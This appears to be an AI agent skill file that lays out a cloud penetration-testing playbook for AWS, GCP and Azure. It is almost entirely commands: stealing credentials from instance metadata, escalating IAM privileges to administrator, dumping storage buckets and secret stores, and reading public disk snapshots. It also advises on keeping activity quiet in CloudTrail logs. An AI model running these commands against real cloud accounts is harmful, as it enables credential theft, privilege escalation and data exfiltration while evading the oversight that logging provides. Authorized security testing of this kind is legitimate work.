---
name: cloud-security
description: Cloud security assessment for AWS, GCP, and Azure covering credential abuse, IAM privilege escalation, storage misconfigs, and serverless attacks
---

# Cloud Security Assessment

Cloud misconfigurations are the most common source of critical data breaches. The attack surface is: exposed credentials, misconfigured storage, overprivileged IAM, metadata service abuse, and serverless/container escapes.

---

## AWS

### IMDS (Instance Metadata Service)

IMDSv1 (no protection — direct request):

    curl http://169.254.169.254/latest/meta-data/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
    # Returns: AccessKeyId, SecretAccessKey, Token

IMDSv2 (token-based — requires PUT first):

    TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
    curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/user-data

ECS Task credentials:

    curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

Lambda environment:

    curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
    # Also check: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY in env vars

### Configure Stolen Credentials

    aws configure
    # Or export directly:
    export AWS_ACCESS_KEY_ID=AKIA...
    export AWS_SECRET_ACCESS_KEY=...
    export AWS_SESSION_TOKEN=...  # for temp creds

    # Verify identity
    aws sts get-caller-identity

### IAM Enumeration

    # Current permissions
    aws iam get-user
    aws iam list-attached-user-policies --user-name <user>
    aws iam list-user-policies --user-name <user>
    aws iam get-user-policy --user-name <user> --policy-name <policy>

    # List all roles and policies
    aws iam list-roles
    aws iam list-policies --scope Local
    aws iam get-policy-version --policy-arn <arn> --version-id v1

    # Automated: enumerate all reachable permissions
    # Install: pip install enumerate-iam
    python3 enumerate-iam.py --access-key <key> --secret-key <secret> --session-token <token>

    # Pacu (AWS pentesting framework)
    pacu
    > import_keys <profile>
    > run iam__enum_permissions
    > run iam__privesc_scan

### IAM Privilege Escalation

Key vectors (over 20 known paths):

    # 1. iam:CreatePolicyVersion — overwrite existing policy with Admin
    aws iam create-policy-version \
      --policy-arn <target_policy_arn> \
      --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
      --set-as-default

    # 2. iam:AttachUserPolicy — attach AdministratorAccess to self
    aws iam attach-user-policy \
      --user-name <your_user> \
      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

    # 3. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
    # Create Lambda with role that has more privileges, invoke it
    aws lambda create-function \
      --function-name privesc \
      --runtime python3.9 \
      --role arn:aws:iam::<account>:role/<privileged_role> \
      --handler index.handler \
      --zip-file fileb://lambda.zip

    # 4. sts:AssumeRole — assume a more privileged role
    aws sts assume-role \
      --role-arn arn:aws:iam::<account>:role/<target_role> \
      --role-session-name pentest

### S3 Misconfigurations

    # Check bucket ACL and policy
    aws s3api get-bucket-acl --bucket <bucket-name>
    aws s3api get-bucket-policy --bucket <bucket-name>

    # List all buckets (if authenticated)
    aws s3 ls

    # Check public access
    aws s3api get-public-access-block --bucket <bucket-name>

    # List bucket contents anonymously
    aws s3 ls s3://<bucket-name> --no-sign-request

    # Download all files
    aws s3 sync s3://<bucket-name> ./output/s3_dump/ --no-sign-request

    # Check for sensitive files
    aws s3 ls s3://<bucket> --recursive --no-sign-request | grep -iE "backup|password|secret|key|config|credentials|db"

    # s3scanner — enumerate permutations
    s3scanner scan --bucket-file output/subdomains.txt

### Secrets Manager / SSM Parameter Store

    aws secretsmanager list-secrets
    aws secretsmanager get-secret-value --secret-id <secret-arn>

    aws ssm describe-parameters
    aws ssm get-parameters --names <param-name> --with-decryption
    aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

### EC2 and EBS

    aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,PrivateIpAddress,Tags]'
    aws ec2 describe-snapshots --owner-ids self
    aws ec2 describe-snapshots --restorable-by-user-ids all  # Public snapshots from your account (bug)

    # Create volume from public snapshot
    aws ec2 create-volume --snapshot-id <snap-id> --availability-zone us-east-1a
    aws ec2 attach-volume --volume-id <vol-id> --instance-id <your-ec2> --device /dev/xvdf
    # Mount and read data

### Lambda

    aws lambda list-functions
    aws lambda get-function --function-name <func>  # Check DownloadLocation in response
    aws lambda get-function-configuration --function-name <func>  # Environment variables!
    # Download source code:
    curl -o /tmp/lambda.zip "$(aws lambda get-function --function-name <func> --query Code.Location --output text)"

### CloudTrail / Evasion Awareness

    # Check if CloudTrail is logging
    aws cloudtrail describe-trails
    aws cloudtrail get-trail-status --name <trail>

    # Low-noise enumeration: prefer Read-only APIs over mutating ones
    # Avoid: CreateUser, AttachPolicy, PutBucketPolicy — high noise
    # Prefer: GetCallerIdentity, DescribeInstances, ListBuckets — common and expected

---

## GCP

### Metadata Service

    # From inside GCP instance:
    curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
    curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
      -H "Metadata-Flavor: Google"
    curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/" -H "Metadata-Flavor: Google"

### GCP Enumeration

    # With stolen token:
    curl -H "Authorization: Bearer <token>" \
      "https://www.googleapis.com/oauth2/v1/tokeninfo"

    # List projects
    gcloud projects list

    # IAM bindings
    gcloud projects get-iam-policy <project-id>
    gcloud iam service-accounts list

    # Service account impersonation
    gcloud iam service-accounts get-iam-policy <sa-email>

### GCS Buckets

    # Check public buckets
    gsutil ls gs://<bucket-name>
    gsutil ls -la gs://<bucket-name>
    gsutil cp gs://<bucket>/** ./output/gcs_dump/

    # Bucket IAM
    gsutil iam get gs://<bucket-name>

    # Check allUsers / allAuthenticatedUsers permissions
    curl https://storage.googleapis.com/storage/v1/b/<bucket>/iam

### Cloud Functions / Run

    gcloud functions list
    gcloud functions describe <function-name>  # Check env vars, source
    gcloud run services list
    gcloud run services describe <service>

---

## Azure

### Metadata Service

    # From inside Azure instance:
    curl -H "Metadata: true" \
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    curl -H "Metadata: true" \
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

### Azure Enumeration

    # With access token:
    az account show
    az account list
    az role assignment list --all
    az ad user list
    az keyvault list
    az storage account list
    az webapp list

### Blob Storage

    # Check public containers
    az storage container list --account-name <account> --auth-mode login
    az storage blob list --container-name <container> --account-name <account>

    # Anonymous access check
    curl "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"

### Azure AD

    # Token from MSI
    curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' \
      -H "Metadata: true"

    # Graph API with token
    curl -H "Authorization: Bearer <token>" \
      "https://graph.microsoft.com/v1.0/users"

    # Check app registrations (may have secrets)
    az ad app list --all

---

## Automated Cloud Scanning

    # Scout Suite — multi-cloud audit
    scout aws --profile <profile> --report-dir output/scout/
    scout gcp --user-account --report-dir output/scout/

    # Prowler — AWS CIS benchmark + extra checks
    prowler aws -M html -o output/prowler/

    # Pacu — AWS exploitation framework
    pacu
    > run iam__enum_permissions
    > run iam__privesc_scan
    > run s3__bucket_finder
    > run ec2__enum

    # CloudSplaining — analyze IAM policies for excessive permissions
    cloudsplaining download --profile <profile>
    cloudsplaining scan --input-file <account-auth>.json

    # Truffledog / GitLeaks — find secrets in code/configs
    trufflehog filesystem ./output/ --json

---

## Pro Tips

1. IMDSv1 is the fastest cloud pivot — if SSRF is found, probe 169.254.169.254 immediately
2. Lambda/Function environment variables are goldmines — frequently contain DB URLs, API keys
3. S3 bucket name enumeration: target.com → target-backup, target-dev, target-staging, target-assets
4. `sts:AssumeRole` with no condition = free lateral movement across roles
5. Public EBS snapshots are a common misconfiguration — search with `restorable-by-user-ids all`
6. Check CloudTrail before any write operations — know what's being logged
7. `iam:PassRole` combined with any compute service = privilege escalation path
8. GCP service account keys in git repos are extremely common — trufflehog every repo found

## Summary

Cloud pentesting is 80% authorization abuse and credential chaining. Find credentials (IMDS, env vars, secrets manager, git repos), enumerate permissions, find a path to admin (IAM privesc, assume-role, PassRole+compute), and escalate. Storage misconfigs are fast wins — always enumerate buckets.
